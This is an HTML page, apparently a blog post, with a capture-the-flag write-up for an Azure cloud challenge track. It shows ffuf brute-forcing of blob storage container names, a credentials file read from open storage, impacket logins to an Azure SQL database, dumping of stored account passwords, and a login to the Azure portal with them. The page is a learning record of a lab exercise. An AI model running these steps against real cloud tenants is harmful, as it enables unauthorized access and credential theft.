@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF writeups</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/posts.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Header will be loaded here -->
+    <div id="header-placeholder"></div>
+    <div class="main-content">
+        <div class="container">
+<h4 id="challenge-details">Challenge details</h4>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>Cloud</td>
+</tr>
+<tr>
+<td><strong>Challenge Type</strong></td>
+<td>Track (3 challenges)</td>
+</tr>
+<tr>
+<td><strong>Points</strong></td>
+<td>4-2-3</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td><code>Seneque</code></td>
+</tr>
+<tr>
+<td><strong>Original Solver</strong></td>
+<td><code>labubu sauce graine</code> (willi34)</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>1/10</td>
+</tr>
+</tbody>
+</table>
+<h4 id="overview">Overview</h4>
+<p>The challenge description gives us a wordlist and tells us that the keyword <code>monacogovernement</code> is used for elections coming up. Since we know this challenge is in the cloud category and the challenge name has <code>Azure</code> inside, we already know what technologies to target.</p>
+<h4 id="part-1-brute-forcing-azure-blob-storages">Part 1 - Brute-forcing azure blob storages</h4>
+<p>The first thing we can do is check for Azure blob storages, Microsoft's storage solution. These usually follow this URL syntax :</p>
+<pre class="codehilite"><code>https://&lt;account&gt;.blob.core.windows.net/&lt;container&gt;/&lt;file&gt;
+</code></pre>
+
+<p>Since the <code>monacogovernement</code> keyword was singled out, we can make an educated guess that this will be our account name. We can verify this by sending a request to the URL :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/cloud]
+└─$ curl https://monacogovernement.blob.core.windows.net
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Error&gt;&lt;Code&gt;InvalidQueryParameterValue&lt;/Code&gt;&lt;Message&gt;Value for one of the query parameters specified in the request URI is invalid.
+RequestId:f1a590b3-001e-008a-420f-2b9f82000000
+Time:2025-09-21T15:53:10.1040065Z&lt;/Message&gt;&lt;QueryParameterName&gt;comp&lt;/QueryParameterName&gt;&lt;QueryParameterValue /&gt;&lt;Reason /&gt;&lt;/Error&gt;                                                                         
+</code></pre>
+
+<p>We can attempt to list the containers in the account, but this doesn't work :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/cloud]
+└─$ curl &quot;https://monacogovernement.blob.core.windows.net/?comp=list&quot;
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Error&gt;&lt;Code&gt;ResourceNotFound&lt;/Code&gt;&lt;Message&gt;The specified resource does not exist.
+RequestId:99843a08-901e-0043-350f-2b226f000000
+Time:2025-09-21T15:53:39.1303929Z&lt;/Message&gt;&lt;/Error&gt;
+</code></pre>
+
+<p>If we had a container name, we could use the blob storage REST API to list the files inside : </p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/cloud]
+└─$ curl &quot;https://monacogovernement.blob.core.windows.net/&lt;container&gt;?restype=container&amp;comp=list&quot;
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Error&gt;&lt;Code&gt;ResourceNotFound&lt;/Code&gt;&lt;Message&gt;The specified resource does not exist.
+RequestId:63ef6c0b-c01e-004e-2910-2beabb000000
+Time:2025-09-21T15:55:10.7396399Z&lt;/Message&gt;&lt;/Error&gt;                              
+</code></pre>
+
+<p>The provided wordlist must be the possible container names. We can use a fuzzer like <code>ffuf</code> (installed on default in Kali Linux) to try every container name in our URL and filter out the existing one by observing the HTTP response :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/cloud]
+└─$ ffuf -w election_wordlist.txt -u &quot;https://monacogovernement.blob.core.windows.net/FUZZ?restype=container&amp;comp=list&quot;
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://monacogovernement.blob.core.windows.net/FUZZ?restype=container&amp;comp=list
+ :: Wordlist         : FUZZ: /home/kali/united/cloud/election_wordlist.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+elections               [Status: 200, Size: 669, Words: 13, Lines: 1, Duration: 26ms]
+
+:: Progress: [674/674] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+</code></pre>
+
+<p>The container name <code>elections</code> is found. Let's list the files inside :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/cloud]
+└─$ curl &quot;https://monacogovernement.blob.core.windows.net/elections?restype=container&amp;comp=list&quot;             
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;EnumerationResults ContainerName=&quot;https://monacogovernement.blob.core.windows.net/elections&quot;&gt;&lt;Blobs&gt;&lt;Blob&gt;&lt;Name&gt;elections.txt&lt;/Name&gt;&lt;Url&gt;https://monacogovernement.blob.core.windows.net/elections/elections.txt&lt;/Url&gt;&lt;Properties&gt;&lt;Last-Modified&gt;Sat, 30 Aug 2025 23:14:15 GMT&lt;/Last-Modified&gt;&lt;Etag&gt;0x8DDE81AF013593D&lt;/Etag&gt;&lt;Content-Length&gt;110&lt;/Content-Length&gt;&lt;Content-Type&gt;text/plain&lt;/Content-Type&gt;&lt;Content-Encoding /&gt;&lt;Content-Language /&gt;&lt;Content-MD5&gt;1hArrMkalVDhRUdcHOF/IA==&lt;/Content-MD5&gt;&lt;Cache-Control /&gt;&lt;BlobType&gt;BlockBlob&lt;/BlobType&gt;&lt;LeaseStatus&gt;unlocked&lt;/LeaseStatus&gt;&lt;/Properties&gt;&lt;/Blob&gt;&lt;/Blobs&gt;&lt;NextMarker /&gt;&lt;/EnumerationResults&gt;                               
+</code></pre>
+
+<p>We can directly fetch this file :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/cloud]
+└─$ curl &quot;https://monacogovernement.blob.core.windows.net/elections/elections.txt&quot;              
+
+our database credentials for our rigged elections are : monacosql:wElOvECLOUD!
+
+flag-st0r4g3-accounts-are-hard 
+</code></pre>
+
+<h4 id="part-2-accessing-an-azure-mssql-database">Part 2 - Accessing an Azure MSSQL database</h4>
+<p>Our next task is looking for a database instance to connect to using our newly found credentials. We're not explicitly told which kind of database this is, so we'll have to figure it out via trial and error.</p>
+<p>There are multiple types of databases capable of being hosted in the cloud by Azure, like MSSQL, MySQL, MongoDB, PostgreSQL, etc. Each of these are given different domain formats, for example :</p>
+<ul>
+<li><code>&lt;account&gt;.database.windows.net</code> : MSSQL</li>
+<li><code>&lt;account&gt;.mysql.database.azure.com</code> : MySQL</li>
+<li><code>&lt;account&gt;.postgres.database.azure.com</code> : PostgreSQL</li>
+</ul>
+<p>To detect which type of database is in use, we can try to communicate with each domain name and see which one responds : </p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/cloud]
+└─$ ping monacogovernement.database.windows.net
+PING cr11.canadacentral1-a.control.database.windows.net (20.48.196.32) 56(84) bytes of data.
+64 bytes from 20.48.196.32: icmp_seq=1 ttl=128 time=16.6 ms
+64 bytes from 20.48.196.32: icmp_seq=2 ttl=128 time=24.4 ms
+^C
+--- cr11.canadacentral1-a.control.database.windows.net ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 16.629/20.512/24.395/3.883 ms
+
+
+┌──(kali㉿kali)-[~/united/cloud]
+└─$ ping monacogovernement.mysql.database.azure.com
+ping: monacogovernement.mysql.database.azure.com: Name or service not known
+
+
+┌──(kali㉿kali)-[~/united/cloud]
+└─$ ping monacogovernement.postgres.database.azure.com
+ping: monacogovernement.postgres.database.azure.com: Name or service not known
+</code></pre>
+
+<p>We can confirm MSSQL is running with NMAP :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/cloud]
+└─$ nmap -p 1433 monacogovernement.database.windows.net
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 12:09 EDT
+Nmap scan report for monacogovernement.database.windows.net (20.48.196.33)
+Host is up (0.0026s latency).
+
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+
+Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
+</code></pre>
+
+<p>To connect to the database, we can use the MSSQL client from the <strong><a href="https://www.kali.org/tools/impacket/">impacket</a></strong> suite : </p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/cloud]
+└─$ impacket-mssqlclient 'monacosql:wElOvECLOUD!@monacogovernement.database.windows.net'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(monacogovernement): Line 1: Changed database context to 'master'.
+[*] INFO(monacogovernement): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (120 345) 
+[!] Press help for extra shell commands
+SQL (monacosql  monacosql@master)&gt; SELECT name FROM master.dbo.sysdatabases
+name                
+-----------------   
+master              
+
+monacogovernement   
+</code></pre>
+
+<p>We can try to list the tables inside the <code>monacogovernement</code> database, but it seems that each connection is tied to a specific database. Since the original connection is tied to the <code>master</code> database, we can't infer any information about the other database nor use it :</p>
+<pre class="codehilite"><code>SQL (monacosql  monacosql@master)&gt; SELECT table_name FROM monacogovernement.INFORMATION_SCHEMA.TABLES
+ERROR(monacogovernement): Line 16: Reference to database and/or server name in 'monacogovernement.INFORMATION_SCHEMA.TABLES' is not supported in this version of SQL Server.
+SQL (monacosql  monacosql@master)&gt; USE monacogovernement;
+ERROR(monacogovernement): Line 1: USE statement is not supported to switch between databases. Use a new connection to connect to a different database.
+SQL (monacosql  monacosql@master)&gt; exit
+</code></pre>
+
+<p>To fix this, we can tell the client to connect to the database we want :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/cloud]
+└─$ impacket-mssqlclient 'monacosql:wElOvECLOUD!@monacogovernement.database.windows.net' -db monacogovernement
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: monacogovernement
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(monacogovernement): Line 1: Changed database context to 'monacogovernement'.
+[*] INFO(monacogovernement): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (120 345) 
+[!] Press help for extra shell commands
+SQL (monacosql  dbo@monacogovernement)&gt; SELECT table_name FROM INFORMATION_SCHEMA.TABLES;
+table_name                
+-----------------------   
+database_firewall_rules   
+
+Employes                  
+
+SQL (monacosql  dbo@monacogovernement)&gt; SELECT * FROM Employes;
+Mail                                                     Password        
+------------------------------------------------------   -------------   
+b'SecretaryOfTheKing@paullorierproton.onmicrosoft.com'   b'ViveLeRoi!'   
+
+b'flag-databases-should-not-be-accessible-to-everyone'   b' '            
+
+SQL (monacosql  dbo@monacogovernement)&gt;
+</code></pre>
+
+<h4 id="part-3-connection-to-the-azure-portal">Part 3 - Connection to the Azure Portal</h4>
+<p>The email left in the MSSQL database looks like a Azure account for a tenant. To login into Azure to check the managed services and users, we can visit the Azure <a href="https://portal.azure.com">Portal</a>. If we enter the credentials found in the database, we can get into the portal :
+<img alt="Azure Web Portal" src="/images/unitedctf2025/azure1.png" /></p>
+<p>If we visit the managed users section, we can find a user with the third flag as its name :
+<img alt="Flag as user" src="/images/unitedctf2025/azure2.png" /></p>
+    <!-- Footer will be loaded here -->
+        </div>
+    </div>
+    <div id="footer-placeholder"></div>
+    <script src="/js/script.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-ruby.min.js"></script>
+</body>
+</html>
